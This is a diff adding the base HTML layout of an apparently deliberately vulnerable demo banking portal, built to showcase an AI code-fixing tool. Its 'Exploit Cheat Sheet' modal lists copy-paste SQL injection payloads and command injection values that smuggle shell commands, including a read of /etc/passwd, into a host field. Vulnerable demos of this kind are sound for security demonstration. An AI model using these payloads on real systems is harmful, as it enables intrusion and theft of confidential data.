@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<!--
+Purpose: Master layout template for ApexFin Banking Portal demo application.
+Architecture/Context: Base HTML wrapper providing Bootstrap 5 styling, navigation header, notifications, and footer.
+Dependencies/Side Effects: Loads Bootstrap 5 CSS/JS from public CDN and local static assets.
+-->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}ApexFin Global Bank{% endblock %} - Core Banking Portal</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <!-- Custom Application CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body class="bg-light d-flex flex-column min-vh-100">
+
+    <!-- Top Navigation Header -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm py-2">
+        <div class="container-fluid px-4">
+            <a class="navbar-brand fw-bold d-flex align-items-center" href="{{ url_for('index') }}">
+                <span class="badge bg-primary me-2 px-2 py-1"><i class="bi bi-bank2"></i></span>
+                <span>ApexFin <span class="text-primary">Global</span></span>
+                <span class="badge bg-danger ms-2" style="font-size: 0.65rem;">DEMO ENVIRONMENT</span>
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarContent">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarContent">
+                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                    <li class="nav-item">
+                        <a class="nav-link {% if request.path == '/' %}active fw-semibold{% endif %}" href="{{ url_for('index') }}">
+                            <i class="bi bi-speedometer2 me-1"></i> Dashboard
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link {% if request.path == '/accounts' %}active fw-semibold{% endif %}" href="{{ url_for('accounts_view') }}">
+                            <i class="bi bi-person-lines-fill me-1"></i> Customer Accounts
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link {% if request.path == '/transfer' %}active fw-semibold{% endif %}" href="{{ url_for('transfer_view') }}">
+                            <i class="bi bi-arrow-left-right me-1"></i> Wire Transfers
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link {% if request.path == '/system-diagnostics' %}active fw-semibold{% endif %}" href="{{ url_for('diagnostics_view') }}">
+                            <i class="bi bi-hdd-network me-1"></i> Gateway Diagnostics
+                        </a>
+                    </li>
+                </ul>
+
+                <div class="d-flex align-items-center">
+                    <button class="btn btn-outline-warning btn-sm me-2" data-bs-toggle="modal" data-bs-target="#demoExploitCheatSheet">
+                        <i class="bi bi-shield-exclamation me-1"></i> Exploit Cheat Sheet
+                    </button>
+                    <span class="navbar-text small text-secondary">
+                        <i class="bi bi-circle-fill text-success" style="font-size: 8px;"></i> Live Ops v2.4
+                    </span>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content Area -->
+    <main class="container-fluid px-4 py-4 flex-grow-1">
+        <!-- Flash Notification Messages -->
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                <div class="row">
+                    <div class="col-12">
+                        {% for category, message in messages %}
+                            <div class="alert alert-{{ category }} alert-dismissible fade show shadow-sm" role="alert">
+                                {{ message }}
+                                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+                            </div>
+                        {% endfor %}
+                    </div>
+                </div>
+            {% endif %}
+        {% endwith %}
+
+        {% block content %}{% endblock %}
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-3 mt-auto">
+        <div class="container-fluid px-4 d-flex justify-content-between align-items-center small text-secondary">
+            <div>
+                &copy; 2026 ApexFin Financial Services Inc. &bull; Internal Sandbox Application
+            </div>
+            <div>
+                Built for <strong class="text-light">Google Cloud CodeMender</strong> AI Customer Engineering Demonstrations
+            </div>
+        </div>
+    </footer>
+
+    <!-- Exploit Cheat Sheet Modal (For CE Demo Facilitation) -->
+    <div class="modal fade" id="demoExploitCheatSheet" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header bg-dark text-white">
+                    <h5 class="modal-title"><i class="bi bi-terminal-dash text-warning me-2"></i>Customer Engineer Exploit Cheat Sheet</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="alert alert-info py-2 small">
+                        <strong>Demo Purpose:</strong> Use these copy-paste payloads during customer presentations to illustrate real-world vulnerability impact before demonstrating CodeMender's autonomous remediation.
+                    </div>
+                    
+                    <h6 class="fw-bold text-danger"><i class="bi bi-1-circle me-1"></i> SQL Injection (CWE-89) &mdash; Accounts Registry</h6>
+                    <p class="small text-muted mb-1">Target: Navigate to <strong>Customer Accounts</strong> page and paste into Search field:</p>
+                    <div class="bg-light p-2 border rounded font-monospace small mb-2 d-flex justify-content-between align-items-center">
+                        <code>' UNION SELECT id, account_number, customer_name, email, account_type, balance, status, is_confidential FROM accounts WHERE is_confidential=1 --</code>
+                        <button class="btn btn-sm btn-outline-secondary copy-btn" data-text="' UNION SELECT id, account_number, customer_name, email, account_type, balance, status, is_confidential FROM accounts WHERE is_confidential=1 --">Copy</button>
+                    </div>
+                    <div class="bg-light p-2 border rounded font-monospace small mb-3 d-flex justify-content-between align-items-center">
+                        <code>' OR 1=1 --</code>
+                        <button class="btn btn-sm btn-outline-secondary copy-btn" data-text="' OR 1=1 --">Copy</button>
+                    </div>
+                    <p class="small text-success mb-3"><i class="bi bi-check-circle"></i> <strong>Result:</strong> Bypasses confidential status to expose secret $48.5M offshore reserve and $912M SWIFT Nostro accounts.</p>
+
+                    <hr>
+
+                    <h6 class="fw-bold text-danger"><i class="bi bi-2-circle me-1"></i> Command Injection (CWE-78) &mdash; Gateway Diagnostics</h6>
+                    <p class="small text-muted mb-1">Target: Navigate to <strong>Gateway Diagnostics</strong> and paste into Host field:</p>
+                    <div class="bg-light p-2 border rounded font-monospace small mb-2 d-flex justify-content-between align-items-center">
+                        <code>127.0.0.1; whoami; id; uname -a</code>
+                        <button class="btn btn-sm btn-outline-secondary copy-btn" data-text="127.0.0.1; whoami; id; uname -a">Copy</button>
+                    </div>
+                    <div class="bg-light p-2 border rounded font-monospace small mb-2 d-flex justify-content-between align-items-center">
+                        <code>127.0.0.1; cat /etc/passwd | head -n 5</code>
+                        <button class="btn btn-sm btn-outline-secondary copy-btn" data-text="127.0.0.1; cat /etc/passwd | head -n 5">Copy</button>
+                    </div>
+                    <p class="small text-success"><i class="bi bi-check-circle"></i> <strong>Result:</strong> Executes arbitrary operating system shell commands under the web server's privilege level.</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap 5 Bundle JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+    <!-- Custom Application JS -->
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
